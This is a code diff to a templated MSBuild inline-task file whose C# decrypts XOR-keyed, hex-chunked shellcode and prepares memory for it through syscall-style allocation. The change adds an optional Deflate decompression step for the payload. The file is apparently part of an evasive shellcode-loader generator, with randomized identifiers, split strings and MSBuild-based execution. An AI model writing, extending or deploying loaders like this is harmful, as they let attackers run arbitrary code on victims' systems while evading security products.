@@ -11,6 +11,7 @@
     <Task>
       <Reference Include="System" />
       <Reference Include="System.Runtime.InteropServices" />
+      <Reference Include="System.IO.Compression" />
       <Using Namespace="System" />
       <Using Namespace="System.Runtime.InteropServices" />
       <Using Namespace="System.Reflection" />
@@ -167,6 +168,15 @@
                 byte[] {{ v.mb_lv_ex_k }} = {{ v.fn_hex }}({% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %});
                 for (int {{ v.mb_lv_ex_ki }} = 0; {{ v.mb_lv_ex_ki }} < {{ v.mb_lv_ex_k }}.Length; {{ v.mb_lv_ex_ki }}++) {{ v.mb_lv_ex_k }}[{{ v.mb_lv_ex_ki }}] ^= (byte){{ key_tweak }};
                 byte[] {{ v.mb_lv_ex_sc }} = {{ v.fn_decrypt }}({{ v.fn_hex }}({% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}), {{ v.mb_lv_ex_k }});
+                {%- if is_compressed %}
+                using (var _csm = new System.IO.MemoryStream({{ v.mb_lv_ex_sc }}))
+                using (var _ds  = new System.IO.Compression.DeflateStream(_csm,
+                                      System.IO.Compression.CompressionMode.Decompress))
+                using (var _dsm = new System.IO.MemoryStream()) {
+                    _ds.CopyTo(_dsm);
+                    {{ v.mb_lv_ex_sc }} = _dsm.ToArray();
+                }
+                {%- endif %}
                 {%- endif %}
 
                 byte[] {{ v.mb_lv_ex_allocn }} = {{ v.mb_fn_n }}(new int[]{ {{ v.jsc_nt_alloc_vm }} });
